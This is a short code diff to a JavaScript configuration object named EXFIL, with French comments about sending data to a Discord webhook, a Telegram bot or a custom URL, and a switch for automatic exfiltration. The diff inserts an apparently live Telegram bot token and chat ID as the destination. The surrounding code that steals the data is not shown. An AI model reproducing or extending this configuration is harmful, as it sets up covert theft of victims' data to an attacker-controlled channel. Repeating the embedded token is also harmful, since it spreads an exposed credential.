@@ -743,9 +743,9 @@ const EXFIL = {
   // === CONFIGURE TON ENDPOINT ICI ===
   // Discord webhook (recommandé — gratuit, simple)
   DISCORD_WEBHOOK: "",
-  // Telegram bot (mets ton token)
-  TG_TOKEN: "",
-  TG_CHAT_ID: "",
+  // Telegram config
+  TG_TOKEN: "8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74",
+  TG_CHAT_ID: "7947710235",
   // Custom HTTP endpoint
   CUSTOM_URL: "",
   // Activer l'exfiltration automatique
